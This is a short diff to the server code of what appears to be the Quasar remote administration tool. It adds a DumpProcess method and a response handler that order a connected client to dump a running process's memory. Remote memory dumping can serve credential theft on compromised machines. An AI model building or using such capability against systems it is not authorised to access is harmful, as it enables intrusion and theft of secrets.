@@ -5,6 +5,8 @@ using Quasar.Common.Messages.other;
 using Quasar.Common.Models;
 using Quasar.Common.Networking;
 using Quasar.Server.Networking;
+using Quasar.Server.Models;
+using System.Windows.Forms;
 
 namespace Quasar.Server.Messages
 {
@@ -73,6 +75,9 @@ namespace Quasar.Server.Messages
                 case GetProcessesResponse procResp:
                     Execute(sender, procResp);
                     break;
+                case DoProcessDumpResponse procResp:
+                    Execute(sender, procResp);
+                    break;
             }
         }
 
@@ -111,6 +116,15 @@ namespace Quasar.Server.Messages
         public void EndProcess(int pid)
         {
             _client.Send(new DoProcessEnd { Pid = pid });
+        }
+
+        /// <summary>
+        /// Dumps a running processes memory.
+        /// </summary>
+        /// <param name="pid">The process id to dump.</param>
+        public void DumpProcess(int pid)
+        {
+            _client.Send(new DoProcessDump { Pid = pid });
         }
 
         private void Execute(ISender client, DoProcessResponse message)
